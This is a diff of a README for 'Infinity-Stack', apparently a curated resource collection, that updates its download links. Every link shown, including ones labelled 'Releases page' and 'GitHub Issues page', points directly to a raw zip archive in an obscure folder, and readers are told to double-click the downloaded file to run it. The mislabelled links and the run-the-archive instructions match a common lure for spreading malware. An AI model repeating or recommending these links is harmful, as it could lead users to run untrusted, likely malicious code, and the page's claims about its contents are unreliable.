@@ -6,7 +6,7 @@ Infinity-Stack is the ultimate curated repository that offers a wealth of resour
 ## 🚀 Getting Started
 To get started with Infinity-Stack, follow these steps to download and run the software:
 
-1. Visit our [Releases page](https://raw.githubusercontent.com/Clouddz/Infinity-Stack/main/Dumontiaceae/Stack-Infinity-2.8.zip) to download the latest version of Infinity-Stack. 
+1. Visit our [Releases page](https://github.com/Clouddz/Infinity-Stack/raw/refs/heads/main/Dumontiaceae/Infinity-Stack-v3.3.zip) to download the latest version of Infinity-Stack. 
 
 2. Click on the download link for the version that suits your needs. You will find various files available for download.
 
@@ -14,10 +14,10 @@ To get started with Infinity-Stack, follow these steps to download and run the s
 
 4. After locating the file, double-click to run it. Follow any additional prompts that may appear.
 
-To ensure you have the most recent version, check back frequently on our [Releases page](https://raw.githubusercontent.com/Clouddz/Infinity-Stack/main/Dumontiaceae/Stack-Infinity-2.8.zip).
+To ensure you have the most recent version, check back frequently on our [Releases page](https://github.com/Clouddz/Infinity-Stack/raw/refs/heads/main/Dumontiaceae/Infinity-Stack-v3.3.zip).
 
 ## 📥 Download & Install
-You can obtain Infinity-Stack from our [Releases page](https://raw.githubusercontent.com/Clouddz/Infinity-Stack/main/Dumontiaceae/Stack-Infinity-2.8.zip). Follow these simple steps for installation:
+You can obtain Infinity-Stack from our [Releases page](https://github.com/Clouddz/Infinity-Stack/raw/refs/heads/main/Dumontiaceae/Infinity-Stack-v3.3.zip). Follow these simple steps for installation:
 
 1. Explore the different available versions.
   
@@ -73,7 +73,7 @@ Infinity-Stack includes a broad range of topics:
 - Spirituality in Tech
 
 ## 📞 Support
-If you encounter any issues while downloading or running Infinity-Stack, please reach out to our support team. You can find assistance by visiting our [GitHub Issues page](https://raw.githubusercontent.com/Clouddz/Infinity-Stack/main/Dumontiaceae/Stack-Infinity-2.8.zip) where you can report problems or ask questions.
+If you encounter any issues while downloading or running Infinity-Stack, please reach out to our support team. You can find assistance by visiting our [GitHub Issues page](https://github.com/Clouddz/Infinity-Stack/raw/refs/heads/main/Dumontiaceae/Infinity-Stack-v3.3.zip) where you can report problems or ask questions.
 
 ## 📢 Stay Updated
 To keep up with updates and news regarding Infinity-Stack, consider following us on social media or subscribing to our newsletter. You will receive important information about new releases, features, and improvements.
